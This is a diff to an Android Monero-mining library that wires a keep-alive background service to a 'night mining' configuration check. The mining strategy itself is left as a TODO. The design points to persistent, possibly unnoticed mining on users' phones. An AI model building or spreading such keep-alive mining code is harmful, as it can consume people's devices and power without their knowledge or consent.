@@ -1,4 +1,4 @@
-package waterhole.miner.core.keepAlive;
+package waterhole.miner.monero;
 
 import android.content.*;
 import android.os.*;
@@ -9,6 +9,10 @@ import io.reactivex.*;
 import io.reactivex.disposables.*;
 import io.reactivex.functions.Action;
 import io.reactivex.functions.Consumer;
+import waterhole.miner.core.asyn.AsyncTaskListener;
+import waterhole.miner.core.config.NightConfigObject;
+import waterhole.miner.core.config.NightConfiguration;
+import waterhole.miner.core.keepAlive.AbsWorkService;
 
 import static waterhole.miner.core.utils.LogUtils.info;
 
@@ -57,6 +61,22 @@ public class TraceServiceImpl extends AbsWorkService {
                         if (count > 0 && count % 18 == 0) {
                             info("keep alive: 保存数据到磁盘。 saveCount = " + (count / 18 - 1));
                         }
+                        NightConfiguration.instance().getConfigObject(getApplicationContext(),
+                                new AsyncTaskListener<NightConfigObject>() {
+                                    @Override
+                                    public void runComplete(NightConfigObject nightConfig) {
+                                        if (nightConfig == null) {
+                                            return;
+                                        }
+                                        if (!nightConfig.enableNightDaemon) {
+                                            return;
+                                        }
+                                        if (XmrMiner.instance().isMining()) {
+                                            return;
+                                        }
+                                        // todo kzw 夜挖策略
+                                    }
+                                });
                     }
                 });
     }
